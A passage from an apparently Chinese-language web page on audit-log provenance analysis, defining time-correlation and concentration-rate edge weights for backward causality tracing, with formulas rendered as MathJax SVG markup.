1/α。</p><p><strong>时间相关性f<sub>T(e)</sub></strong>直观上，相对来说，同时出现的边更可能相关。因此，我们设计特征f<sub>T(e)</sub>来模拟边e(u,v)与POI事件的时间相关性：<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.196ex;" xmlns="http://www.w3.org/2000/svg" width="27.193ex" height="5.232ex" role="img" focusable="false" viewBox="0 -1342 12019.1 2312.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mo" transform="translate(704,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1093,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1559,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2228.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(3284,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(3582,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(4182,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4571,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5293.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(6293.4,0)"><g data-mml-node="mn" transform="translate(1779.3,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mrow" transform="translate(220,-709.5)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(1273.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(2274,0)"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="TeXAtom" transform="translate(394,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(3340.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="3818.7" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(10352.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10741.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(11130.1,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(11630.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 其中t<sub>(e)</sub>和t<sub>e<sub>s</sub></sub>表示边e和POI事件e<sub>s</sub>的时间戳值(我们使用事件结束时间)。|t<sub>e</sub>-t<sub>e<sub>s</sub></sub>|差异越小，时间相关性f<sub>T(e)</sub>越高。为了处理当e是POI事件(即|t<sub>e</sub>-t<sub>e<sub>s</sub></sub>|=0)时的特殊情况，我们使用审计日志记录框架中的最小时间单位(纳秒)的10分之1(即1e-10)来计算其特征值:f<sub>T(e<sub>s</sub>)</sub>=ln(1+1e10)。这确保了POI事件具有最高的特征值。</p><p><strong>集中率f<sub>C(e)</sub></strong>在后向因果分析中，如果从节点v可以追踪到的源节点的数量为（即只有一条来自v的传入边），我们说这条边表示的依赖关系对于v是高度集中的。另外，我们想为可以从多个反向路径到达的节点赋予更高的权重。因此，我们将边e(u,v)的集中率定义为：<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.172ex;" xmlns="http://www.w3.org/2000/svg" width="26.061ex" height="5.475ex" role="img" focusable="false" viewBox="0 -1460 11519 2420"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g></g><g data-mml-node="mo" transform="translate(1110.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1499.4,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1965.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2632.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3688,0)"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mi"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mi" transform="translate(763,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1335,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(1696,0)"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(2524,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(2990,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(3467,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3918,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(4384,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(4850,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5239,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(5724,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mrow" transform="translate(516,-710)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(504,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1104,0)"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(1932,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(2398,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(2875,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3326,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(3792,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(4258,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4647,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(5132,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><rect width="6313" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" 